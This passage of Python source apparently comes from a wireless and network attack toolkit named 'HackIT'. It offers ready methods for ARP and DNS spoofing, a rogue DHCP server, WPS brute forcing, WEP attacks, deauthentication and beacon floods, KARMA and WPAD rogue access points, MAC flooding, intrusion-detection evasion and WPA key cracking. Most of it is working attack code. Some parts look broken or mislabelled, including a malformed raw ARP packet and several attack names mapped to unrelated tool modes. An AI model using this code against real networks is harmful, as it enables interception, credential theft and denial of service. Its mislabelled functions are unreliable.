            subprocess.run(["netsh", "wlan", "set", "autoconfig", "enabled=no", f"interface={iface}"],
                           stderr=subprocess.DEVNULL)
            UI.print_success(f"{iface} → promiscuous mode")
        else:
            subprocess.run(["netsh", "wlan", "set", "autoconfig", "enabled=yes", f"interface={iface}"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(["netsh", "wlan", "set", "allowexplicitcreds", "enabled"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(["netsh", "interface", "set", "interface", f"name={iface}", "admin=enabled"],
                           stderr=subprocess.DEVNULL)
            UI.print_success(f"{iface} → managed")

    # ── Session management ───────────────────────────────────────

    def do_session_delete(self, session_id: str, **kwargs):
        session_file = BASE / "go_workers" / "sessions.json"
        if not session_file.exists():
            UI.print_error("No sessions file found.")
            return
        try:
            data = json.loads(session_file.read_text())
            sessions = data if isinstance(data, list) else data.get("sessions", [])
            new_sessions = [s for s in sessions if s.get("id") != session_id]
            if len(new_sessions) == len(sessions):
                UI.print_error(f"Session '{session_id}' not found.")
                return
            if isinstance(data, list):
                session_file.write_text(json.dumps(new_sessions, indent=2))
            else:
                data["sessions"] = new_sessions
                session_file.write_text(json.dumps(data, indent=2))
            UI.print_success(f"Session '{session_id}' deleted.")
        except Exception as e:
            UI.print_error(f"Delete failed: {e}")

    def do_session_info(self, session_id: str, **kwargs):
        session_file = BASE / "go_workers" / "sessions.json"
        if not session_file.exists():
            UI.print_error("No sessions file found.")
            return
        try:
            data = json.loads(session_file.read_text())
            sessions = data if isinstance(data, list) else data.get("sessions", [])
            for s in sessions:
                if s.get("id") == session_id:
                    table = Table(title=f"Session {session_id}", border_style="cyan")
                    table.add_column("Key", style="yellow")
                    table.add_column("Value", style="white")
                    for k, v in s.items():
                        table.add_row(k, str(v))
                    _console.print(table)
                    return
            UI.print_error(f"Session '{session_id}' not found.")
        except Exception as e:
            UI.print_error(f"Info failed: {e}")

    # ── Report management ────────────────────────────────────────

    def do_report_list(self, **kwargs):
        reports_dir = BASE / "reports"
        if not reports_dir.is_dir():
            UI.print_info("No reports directory found.")
            return
        files = sorted(reports_dir.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
        if not files:
            UI.print_info("No reports generated yet.")
            return
        table = Table(title="Reports", border_style="cyan")
        table.add_column("Name", style="yellow")
        table.add_column("Size", style="white")
        table.add_column("Modified", style="green")
        for f in files[:20]:
            mod = dt.datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
            table.add_row(f.name, f"{f.stat().st_size}B", mod)
        _console.print(table)

    # ── Workspace management ─────────────────────────────────────

    def do_workspace_list(self, **kwargs):
        ws_dir = BASE / "workspaces"
        if not ws_dir.is_dir():
            UI.print_info("No workspaces found.")
            return
        dirs = sorted(ws_dir.iterdir()) if ws_dir.exists() else []
        if not dirs:
            UI.print_info("No workspaces found.")
            return
        table = Table(title="Workspaces", border_style="cyan")
        table.add_column("Name", style="yellow")
        table.add_column("Path", style="white")
        table.add_column("Created", style="green")
        for d in dirs:
            if d.is_dir():
                cfg = d / "config.json"
                created = "?"
                if cfg.exists():
                    try:
                        created = json.loads(cfg.read_text()).get("created", "?")
                    except Exception:
                        pass
                table.add_row(d.name, str(d), created)
        _console.print(table)

    def do_workspace_delete(self, name: str, **kwargs):
        ws = BASE / "workspaces" / name
        if not ws.is_dir():
            UI.print_error(f"Workspace '{name}' not found.")
            return
        shutil.rmtree(ws)
        UI.print_success(f"Workspace '{name}' deleted.")

    # ── Job management ───────────────────────────────────────────

    def do_job_purge(self, **kwargs):
        self.jobs.stop_all()
        with self.jobs._lock:
            self.jobs._jobs.clear()
            self.jobs._counter = 0
        UI.print_success("All jobs purged.")

    # ── ARP table ────────────────────────────────────────────────

    def do_arp_table(self, **kwargs):
        table = Table(title="ARP Table", border_style="cyan")
        table.add_column("IP", style="yellow")
        table.add_column("HW Type", style="white")
        table.add_column("Flags", style="green")
        table.add_column("MAC", style="cyan")
        table.add_column("Mask", style="white")
        table.add_column("Device", style="magenta")
        try:
            if os.name == "nt":
                out = subprocess.check_output("arp -a", shell=True, text=True)
                for line in out.splitlines():
                    parts = line.split()
                    if len(parts) >= 3 and parts[0].count(".") == 3:
                        table.add_row(parts[0], "ether", "C", parts[1], "*", parts[2])
            else:
                with open("/proc/net/arp") as f:
                    for i, line in enumerate(f):
                        if i == 0:
                            continue
                        parts = line.split()
                        if len(parts) >= 6:
                            table.add_row(parts[0], parts[1], parts[2], parts[3], parts[4], parts[5])
            _console.print(table)
        except Exception as e:
            UI.print_error(f"ARP table failed: {e}")

    # ── DNS operations ───────────────────────────────────────────

    def do_dns_sniff(self, iface: str = "", **kwargs):
        timeout = kwargs.get("timeout", 30)
        output = kwargs.get("output", "")
        iface = iface or self._default_iface()
        if not iface:
            UI.print_error("No interface specified.")
            return
        try:
            cmd = ["sudo", "tcpdump", "-i", iface, "-n", "port", "53", "-X"]
            if output:
                cmd.extend(["-w", output])
            UI.print_info(f"Sniffing DNS on {iface} for {timeout}s...")
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            try:
                stdout, stderr = proc.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout, stderr = proc.communicate()
            if stdout:
                for line in stdout.splitlines()[-30:]:
                    print(f"  {line}")
            if stderr and "error" in stderr.lower():
                UI.print_warning(stderr[:200])
        except FileNotFoundError:
            UI.print_error("tcpdump not found. Install with: apt install tcpdump")

    def do_dns_resolve(self, host: str, **kwargs):
        try:
            import socket
            result = socket.getaddrinfo(host, None)
            table = Table(title=f"DNS Resolution: {host}", border_style="cyan")
            table.add_column("Family", style="yellow")
            table.add_column("Type", style="white")
            table.add_column("Protocol", style="green")
            table.add_column("Address", style="cyan")
            seen = set()
            for res in result:
                family = "IPv6" if res[0] == socket.AF_INET6 else "IPv4"
                addr = res[4][0]
                if addr not in seen:
                    seen.add(addr)
                    table.add_row(family, str(res[1]), str(res[2]), addr)
            _console.print(table)
        except socket.gaierror:
            UI.print_error(f"Cannot resolve: {host}")
        except Exception as e:
            UI.print_error(f"DNS resolve failed: {e}")

    def do_dns_spoof(self, target: str, spoof_ip: str, **kwargs):
        iface = kwargs.get("iface", self._default_iface())
        if not iface:
            UI.print_error("No interface specified.")
            return
        try:
            from hackit.network_scanner import get_gateway
        except ImportError:
            import socket as _sk
        try:
            UI.print_info(f"Starting ARP + DNS spoof: {target} → {spoof_ip} on {iface}")
            import socket as _sock
            dst_ip = _sock.gethostbyname(target) if not target.replace(".", "").isdigit() else target
            # detect gateway
            try:
                gw_out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
                gateway = gw_out.split()[2]
            except Exception:
                try:
                    gw_out = subprocess.check_output(["route", "-n"], text=True)
                    gateway = [l.split()[1] for l in gw_out.splitlines() if l.startswith("0.0.0.0")][0]
                except Exception:
                    gateway = self._detect_gateway()
            arpspoof = shutil.which("arpspoof")
            if not arpspoof:
                UI.print_warning("arpspoof not found, using raw ARP spoof")
                arp_proc = subprocess.Popen(
                    [sys.executable, "-c", f"""
import socket, struct, time
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))
s.bind(('{iface}', 0))
src_mac = b'\\x02\\x00\\x00\\x00\\x00\\x01'
gw_mac_byte = bytes.fromhex(''.join('00' for _ in range(6)))
pkt = struct.pack('!6s6sHH', src_mac, struct.pack('!6s', bytes.fromhex('ffffff000000'.replace('ff','00'))), 1, 2) + src_mac + socket.inet_aton('{spoof_ip}') + bytes.fromhex('000000000000') + socket.inet_aton('{dst_ip}')
while True: s.send(pkt); time.sleep(2)
"""],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            else:
                arp_proc = subprocess.Popen(
                    [arpspoof, "-i", iface, "-t", dst_ip, gateway],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            UI.print_info(f"Poisoning ARP for {dst_ip} → {spoof_ip} ... Ctrl+C to stop")
            try:
                arp_proc.wait()
            except KeyboardInterrupt:
                arp_proc.terminate()
                subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
                UI.print_success("DNS spoof stopped.")
        except FileNotFoundError:
            UI.print_error("arpspoof not found. Install: apt install dsniff")
        except Exception as e:
            UI.print_error(f"DNS spoof failed: {e}")
            subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)

    # ── DHCP Spoof (Rogue DHCP server) ─────────────────────────

    def do_dhcp_spoof(self, interface: Optional[str] = None, pool: Optional[str] = None, **kwargs):
        interface = interface or self._default_iface()
        if not shutil.which("dnsmasq"):
            UI.print_error("dnsmasq required for DHCP spoof. Install: apt install dnsmasq")
            return
        UI.print_info(f"DHCP spoof on {interface} pool {pool}")
        conf = f"/tmp/hackit_dhcp_{interface}.conf"
        try:
            with open(conf, "w") as f:
                f.write(f"interface={interface}\n")
                f.write(f"dhcp-range={pool},255.255.255.0,12h\n")
                gw = self._detect_gateway()
                f.write(f"dhcp-option=3,{gw}\n")
                f.write(f"dhcp-option=6,{gw}\n")
                f.write("log-dhcp\n")
            proc = subprocess.Popen(["sudo", "dnsmasq", "-C", conf, "-d", "--no-resolv", "--no-hosts"],
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            jid = self.jobs.start(f"dhcp-spoof-{interface}", proc)
            UI.print_success(f"Rogue DHCP server started on {interface} (job {jid})")
        except Exception as e:
            UI.print_error(f"DHCP spoof failed: {e}")

    # ── Crack display ────────────────────────────────────────────

    def do_crack_show(self, job_id: str = "", **kwargs):
        jobs = self.jobs.list_jobs()
        if job_id:
            jobs = [j for j in jobs if j["id"] == job_id]
            if not jobs:
                UI.print_error(f"Job '{job_id}' not found.")
                return
        if not jobs:
            UI.print_info("No crack jobs.")
            return
        table = Table(title="Crack Jobs", border_style="cyan")
        table.add_column("ID", style="yellow")
        table.add_column("Name", style="white")
        table.add_column("Status", style="green")
        table.add_column("Started", style="cyan")
        for j in jobs:
            if "crack" in j["name"].lower():
                table.add_row(j["id"], j["name"], j["status"], j["started"])
        _console.print(table)

    # ── WPS brute-force ──────────────────────────────────────────

    def do_wps_bruteforce(self, iface: str, bssid: str, **kwargs):
        UI.print_info(f"WPS brute-force on {iface} → {bssid}")
        try:
            reaver = shutil.which("reaver")
            if reaver:
                cmd = [reaver, "-i", iface, "-b", bssid, "-vv", "-K", "1"]
                timeout = kwargs.get("timeout", 0)
                if timeout:
                    cmd.extend(["-t", str(timeout)])
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                jid = self.jobs.start(f"wps-brute-{bssid[:8]}", proc)
                UI.print_success(f"WPS brute started (job {jid})")
                return
            bully = shutil.which("bully")
            if bully:
                cmd = [bully, iface, "-b", bssid, "-v", "3"]
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                jid = self.jobs.start(f"wps-brute-{bssid[:8]}", proc)
                UI.print_success(f"WPS brute started (job {jid})")
                return
            UI.print_error("Neither reaver nor bully found. Install: apt install reaver bully")
        except Exception as e:
            UI.print_error(f"WPS brute failed: {e}")

    # ── WEP chopchop attack ──────────────────────────────────────

    def do_wep_chopchop(self, iface: str, bssid: str, **kwargs):
        output = kwargs.get("output", f"wep_chop_{bssid[:8].replace(':','')}.cap")
        UI.print_info(f"WEP chopchop on {iface} → {bssid}")
        try:
            aireplay = shutil.which("aireplay-ng")
            if not aireplay:
                UI.print_error("aireplay-ng not found. Install aircrack-ng.")
                return
            airodump = shutil.which("airodump-ng")
            if airodump:
                prefix = output.replace(".cap", "")
                dump = subprocess.Popen(
                    [airodump, "-c", "1", "--bssid", bssid, "-w", prefix, "--output-format", "pcap", iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            chop = subprocess.Popen(
                [aireplay, "--chopchop", "-b", bssid, "-h", "FF:FF:FF:FF:FF:FF", iface],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            jid = self.jobs.start(f"wep-chop-{bssid[:8]}", chop)
            UI.print_success(f"Chopchop started (job {jid}), output: {output}")
        except Exception as e:
            UI.print_error(f"WEP chopchop failed: {e}")

    # ── WEP Fragment (GUI alias: do_wep_fragment → do_wep_frag) ──

    def do_wep_fragment(self, interface: Optional[str] = None, bssid: str = "", count: int = 3000, **kwargs):
        interface = interface or self._default_iface()
        return self.do_wep_frag(iface=interface, bssid=bssid, count=count, **kwargs)

    # ── WEP fragmentation attack ─────────────────────────────────

    def do_wep_frag(self, iface: str, bssid: str, **kwargs):
        output = kwargs.get("output", f"wep_frag_{bssid[:8].replace(':','')}.cap")
        UI.print_info(f"WEP fragmentation on {iface} → {bssid}")
        try:
            aireplay = shutil.which("aireplay-ng")
            if not aireplay:
                UI.print_error("aireplay-ng not found. Install aircrack-ng.")
                return
            airodump = shutil.which("airodump-ng")
            if airodump:
                prefix = output.replace(".cap", "")
                dump = subprocess.Popen(
                    [airodump, "-c", "1", "--bssid", bssid, "-w", prefix, "--output-format", "pcap", iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            frag = subprocess.Popen(
                [aireplay, "--fragment", "-b", bssid, "-h", "FF:FF:FF:FF:FF:FF", iface],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            jid = self.jobs.start(f"wep-frag-{bssid[:8]}", frag)
            UI.print_success(f"Fragmentation started (job {jid}), output: {output}")
        except Exception as e:
            UI.print_error(f"WEP frag failed: {e}")

    # ── Multi-SSID beacon flood ──────────────────────────────────

    def do_beacon_flood_multi(self, iface: str, ssids: list[str] = None, **kwargs):
        if not ssids:
            UI.print_error("No SSIDs provided.")
            return
        count = kwargs.get("count", 50)
        channel = kwargs.get("channel", 6)
        UI.print_info(f"Multi-SSID beacon flood: {len(ssids)} SSIDs on {iface} ch{channel}")
        try:
            import json
            ssid_json = json.dumps(ssids)
            cmd = [
                sys.executable, "-c",
                f"""
import socket, struct, time, json, sys
ssids = json.loads('{ssid_json}')
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
s.bind(('{iface}', 0))
while True:
    for ssid in ssids:
        bssid = bytes.fromhex(':'.join(ssid.encode().hex()[i:i+2] for i in range(0,12)).replace(':','').ljust(12,'0')[:12])
        frame = b'\\x80\\x00\\x00\\x00' + b'\\xff\\xff\\xff\\xff\\xff\\xff' + bssid * 2
        frame += b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
        frame += struct.pack('B', len(ssid)) + ssid.encode()
        frame += b'\\x01\\x08\\x02\\x04\\x0b\\x0c\\x12\\x18\\x24\\x03\\x01\\x06'
        try: s.send(frame)
        except: pass
        time.sleep(0.01)
"""]
            proc = subprocess.Popen(
                ["sudo"] + cmd,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            jid = self.jobs.start(f"beacon-multi-{len(ssids)}ssids", proc)
            UI.print_success(f"Beacon flood started (job {jid})")
        except Exception as e:
            UI.print_error(f"Beacon flood failed: {e}")

    # ── Auth DoS ──────────────────────────────────────────────
    def do_auth_dos(self, interface: Optional[str] = None, bssid: str = "", count: int = 1000, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"Auth DoS: {bssid} x{count} on {interface}")
        tool = _which("mdk4") or _which("mdk3")
        if tool:
            cmd = ["sudo", tool, interface, "a", "-a", bssid, "-s", str(count)]
            self.jobs.start(f"auth-dos-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success(f"Auth DoS started on {bssid}")
        else:
            UI.print_error("mdk4/mdk3 required for auth DoS")

    # ── Assoc Flood ───────────────────────────────────────────
    def do_assoc_flood(self, interface: Optional[str] = None, bssid: str = "", count: int = 1000, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"Assoc flood: {bssid} x{count} on {interface}")
        tool = _which("mdk4") or _which("mdk3")
        if tool:
            cmd = ["sudo", tool, interface, "a", "-a", bssid, "-m", "-s", str(count)]
            self.jobs.start(f"assoc-flood-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success(f"Assoc flood started on {bssid}")
        else:
            UI.print_error("mdk4/mdk3 required for assoc flood")

    # ── EAPOL Start Flood ─────────────────────────────────────
    def do_eapol_start_flood(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"EAPOL Start flood: {bssid} x{count}")
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "e", "-a", bssid, "-t", str(count)]
            self.jobs.start(f"eapol-start-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("EAPOL Start flood running")
        else:
            UI.print_error("mdk4 required")

    # ── EAPOL Logoff ──────────────────────────────────────────
    def do_eapol_logoff(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"EAPOL Logoff flood: {bssid}")
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "e", "-a", bssid, "-l", "-t", str(count)]
            self.jobs.start(f"eapol-logoff-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("EAPOL Logoff flood running")
        else:
            UI.print_error("mdk4 required")

    # ── CTS/RTS Flood ─────────────────────────────────────────
    def do_cts_flood(self, interface: Optional[str] = None, count: int = 1000, duration: int = 500, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "f", "-t", str(count), "-d", str(duration)]
            self.jobs.start("cts-flood", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("CTS flood running")
        else:
            UI.print_error("mdk4 required")

    # ── Power Save DoS ────────────────────────────────────────
    def do_powersave_dos(self, interface: Optional[str] = None, station: str = "", count: int = 2000, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "p", "-t", station, "-c", str(count)] if station else ["sudo", mdk, interface, "p", "-c", str(count)]
            self.jobs.start("powersave-dos", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("Power Save DoS running")
        else:
            UI.print_error("mdk4 required")

    # ── Disassoc Flood ────────────────────────────────────────
    def do_disassoc_flood(self, interface: Optional[str] = None, bssid: str = "", count: int = 1000, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"Disassoc flood: {bssid} x{count}")
        proc = subprocess.Popen(["bash", "-c", f"for i in $(seq 1 {count}); do sudo aireplay-ng -0 1 -a {bssid} {interface} 2>/dev/null; done"],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.jobs.start(f"disassoc-{bssid}", proc)
        UI.print_success("Disassoc flood running")

    # ── WPAD Attack ───────────────────────────────────────────
    def do_wpad_attack(self, interface: Optional[str] = None, ssid: str = "", **kwargs):
        interface = interface or self._default_iface()
        if not ssid: ssid = f"HackIT_{int(time.time()) % 10000}"
        UI.print_info(f"WPAD attack: {ssid} on {interface}")
        if _which("airbase-ng"):
            proc = subprocess.Popen(["sudo", "airbase-ng", "-e", ssid, "-c", "6", "-P", interface],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.jobs.start(f"wpad-{ssid}", proc)
            UI.print_success(f"WPAP rogue AP '{ssid}' running — use responder to capture hashes")
        else:
            UI.print_error("airbase-ng required")

    # ── KARMA Attack ──────────────────────────────────────────
    def do_karma(self, interface: Optional[str] = None, channel: int = 6, ssid: str = "", verbose: bool = False, **kwargs):
        interface = interface or self._default_iface()
        ssid = ssid or "KARMA"
        UI.print_info(f"KARMA attack: responding to all probes on {interface}")
        if _which("airbase-ng"):
            proc = subprocess.Popen(["sudo", "airbase-ng", "-P", "-C", "30", "-e", ssid, "-c", str(channel), interface],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.jobs.start("karma", proc)
            UI.print_success("KARMA attack running — capturing client probes")
        else:
            UI.print_error("airbase-ng required")

    # ── MDA (Michaely Disassociation) ─────────────────────────
    def do_mda(self, interface: Optional[str] = None, bssid: str = "", count: int = 100, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "m", "-a", bssid, "-t", str(count)]
            self.jobs.start(f"mda-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success(f"MDA attack on {bssid}")
        else:
            UI.print_error("mdk4 required")

    # ── TKIP MIC Exploit ──────────────────────────────────────
    def do_tkip_mic(self, interface: Optional[str] = None, bssid: str = "", station: str = "", **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "m", "-a", bssid]
            if station: cmd.extend(["-c", station])
            self.jobs.start(f"tkip-mic-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("TKIP MIC exploit running")
        else:
            UI.print_error("mdk4 required")

    # ── WIDS Evasion ──────────────────────────────────────────
    def do_wids_evasion(self, interface: Optional[str] = None, rate: int = 1, count: int = 100, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "w", "-e", "-t", str(count), "-s", str(rate)]
            self.jobs.start("wids-evasion", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("WIDS evasion running")
        else:
            UI.print_error("mdk4 required")

    # ── Fragmentation Attack ──────────────────────────────────
    def do_frag_attack(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "f", "-t", str(count)]
            self.jobs.start(f"frag-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("Fragmentation attack running")
        else:
            UI.print_error("mdk4 required")

    # ── Omerta Attack ─────────────────────────────────────────
    def do_omerta(self, interface: Optional[str] = None, channel: int = 6, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "d", "-c", str(channel)]
            self.jobs.start("omerta", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("Omerta attack running — blocking probe responses")
        else:
            UI.print_error("mdk4 required")

    # ── EAP Hammer ────────────────────────────────────────────
    def do_eap_hammer(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "e", "-a", bssid, "-t", str(count)]
            self.jobs.start(f"eap-hammer-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("EAP hammer running")
        else:
            UI.print_error("mdk4 required")

    # ── WPA Key Guess (offline) ───────────────────────────────
    def do_wpa_key_guess(self, pmkid: str = "", ssid: str = "", wordlist: str = "", **kwargs):
        if not wordlist:
            wordlist = "/usr/share/wordlists/rockyou.txt" if os.path.exists("/usr/share/wordlists/rockyou.txt") else "/usr/share/dict/words"
        if not pmkid:
            UI.print_error("PMKID hash required")
            return
        UI.print_info(f"WPA key guess: mode 16800 with {wordlist}")
        if _which("hashcat"):
            proc = subprocess.Popen(["hashcat", "-m", "16800", pmkid, wordlist, "--force", "--potfile-path", "/tmp/hackit_pot"],
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.jobs.start("wpa-key-guess", proc)
            UI.print_success("Key guessing started")
        else:
            UI.print_error("hashcat required")

    # ── RRB Attack ────────────────────────────────────────────
    def do_rrb_attack(self, interface: Optional[str] = None, bssid: str = "", **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "d"]
            self.jobs.start("rrb-attack", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("RRB attack running")
        else:
            UI.print_error("mdk4 required")

    # ── CAPWAP Attack ─────────────────────────────────────────
    def do_capwap(self, interface: Optional[str] = None, controller: str = "", **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "x"]
            self.jobs.start("capwap", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("CAPWAP attack running")
        else:
            UI.print_error("mdk4 required")

    # ── HIRB Attack ───────────────────────────────────────────
    def do_hirb(self, interface: Optional[str] = None, target: str = "", **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "b", "-n", "HIRB"]
            self.jobs.start("hirb", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("HIRB attack running")
        else:
            UI.print_error("mdk4 required")

    # ── WPA2 Group Key Flood ──────────────────────────────────
    def do_wpa2_groupkey(self, interface: Optional[str] = None, bssid: str = "", count: int = 200, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "g", "-a", bssid, "-t", str(count)]
            self.jobs.start(f"groupkey-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("WPA2 group key flood running")
        else:
            UI.print_error("mdk4 required")

    # ── Wireless Bridge Attack ────────────────────────────────
    def do_bridge_attack(self, interface: Optional[str] = None, bridge_ip: str = "", **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "b"]
            self.jobs.start("bridge-attack", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("Bridge attack running")
        else:
            UI.print_error("mdk4 required")

    # ── MAC Flooding ──────────────────────────────────────────
    def do_mac_flood(self, interface: Optional[str] = None, count: int = 5000, rate: int = 100, **kwargs):
        interface = interface or self._default_iface()
        if _which("macof"):
            cmd = ["sudo", "macof", "-i", interface, "-n", str(count), "-s", str(rate)]
            self.jobs.start("mac-flood", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("MAC flooding running")
        else:
            UI.print_error("macof (dsniff) required")

    # ── Known Beacon SSID ─────────────────────────────────────
    def do_known_beacon(self, interface: Optional[str] = None, list: str = "enterprise", channel: int = 6, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "b", "-c", str(channel)]
            self.jobs.start("known-beacon", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("Known beacon flood running")
        else:
            UI.print_error("mdk4 required")

    # ── Channel Survey ────────────────────────────────────────
    def do_channel_survey(self, interface: Optional[str] = None, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"Channel survey on {interface}")
        proc = subprocess.Popen(["sudo", "airodump-ng", "--band", "abg", interface, "--write", "/tmp/hackit_survey", "--output-format", "csv"],
                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        self.jobs.start("channel-survey", proc)
        UI.print_success("Channel survey started (Ctrl+C to stop)")

    # ── Probe flood with custom SSIDs ────────────────────────────

    def do_probe_flood_ssids(self, iface: str, ssids: list[str] = None, **kwargs):
        if not ssids:
            UI.print_error("No SSIDs provided.")
            return
        count = kwargs.get("count", 100)
        UI.print_info(f"Probe flood: {len(ssids)} SSIDs on {iface}")
        try:
            ssid_csv = ",".join(ssids)
            proc = subprocess.Popen(
                ["bash", "-c",
                 f"for s in $(echo '{ssid_csv}' | tr ',' ' '); do "
                 f"  for i in $(seq 1 {count}); do "
                 f"    sudo iw dev {iface} scan trigger &>/dev/null; "
                 f"  done; "
                 f"done"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            jid = self.jobs.start(f"probe-flood-{len(ssids)}ssids", proc)
            UI.print_success(f"Probe flood started (job {jid})")
        except Exception as e:
            UI.print_error(f"Probe flood failed: {e}")
